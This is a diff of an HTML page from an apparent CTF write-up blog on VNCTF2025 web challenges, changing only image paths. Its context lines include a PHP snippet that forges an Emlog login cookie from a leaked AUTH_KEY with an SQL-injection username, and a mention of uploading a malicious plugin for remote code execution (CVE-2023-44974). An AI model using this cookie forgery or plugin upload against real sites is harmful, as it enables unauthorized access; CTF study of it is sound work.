@@ -48,10 +48,10 @@
 <meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250210161426050.png">
 <meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250210161242617.png">
 <meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250210161342127.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211213625630.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214340591.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214831024.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214930685.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250211213625630.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250211214340591.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250211214831024.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/02/09/VNCTF2025-WEB/image-20250211214930685.png">
 <meta property="article:published_time" content="2025-02-08T16:46:20.000Z">
 <meta property="article:modified_time" content="2025-02-13T17:32:12.465Z">
 <meta property="article:author" content="EddieMurphy">
@@ -436,15 +436,15 @@
 <p>或者用AUTH_KEY生成万能密码直接登录：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateAuthCookie</span>(<span class="hljs-params"><span class="hljs-variable">$user_login</span>, <span class="hljs-variable">$expiration</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">emHash</span>(<span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>);<br>    <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$hash</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">emHash</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">generateAuthCookie</span>(<span class="hljs-string">&quot;&#x27; or 1=1#&quot;</span>, <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211213625630.png" srcset="/img/loading.gif" lazyload alt="image-20250211213625630"></p>
+<p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211213625630.png" srcset="/img/loading.gif" lazyload alt="image-20250211213625630"></p>
 <p>后续后台上传恶意插件RCE：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/W13680336969/article/details/137267677">Emlog Pro 任意文件上传漏洞（CVE-2023-44974）_emlog v2.2.0后台插件上传漏洞-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/yangliukk/emlog/tree/main">yangliukk&#x2F;emlog</a></p>
 <p>压缩包中必须存在一个与压缩包同名的PHP文件，并且上传成功不会返回上传路径。</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214340591.png" srcset="/img/loading.gif" lazyload alt="image-20250211214340591"></p>
+<p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214340591.png" srcset="/img/loading.gif" lazyload alt="image-20250211214340591"></p>
 <p>打包上传：</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214831024.png" srcset="/img/loading.gif" lazyload alt="image-20250211214831024"></p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB/image-20250211214930685.png" srcset="/img/loading.gif" lazyload alt="image-20250211214930685"></p>
+<p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214831024.png" srcset="/img/loading.gif" lazyload alt="image-20250211214831024"></p>
+<p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214930685.png" srcset="/img/loading.gif" lazyload alt="image-20250211214930685"></p>
 
                 
               </div>
